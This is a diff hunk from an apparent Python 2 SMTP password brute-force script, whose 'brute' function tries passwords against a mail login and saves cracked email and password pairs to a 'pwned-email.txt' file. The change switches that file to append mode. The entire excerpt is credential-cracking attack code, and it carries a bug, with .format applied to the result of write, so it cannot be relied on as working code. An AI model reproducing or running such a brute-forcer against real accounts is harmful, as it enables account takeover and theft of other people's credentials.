@@ -38,7 +38,7 @@ def brute(i):
   try:
     smptserver.login(user, ii)
     print "\t[+] Pwneedd: {}:{}\n".format(user, ii)
-    arq = open('pwned-email.txt')
+    arq = open('pwned-email.txt', 'a')
     arq.write("Email {} Senha {}").format(user, ii)
     arq.close()
     exit()
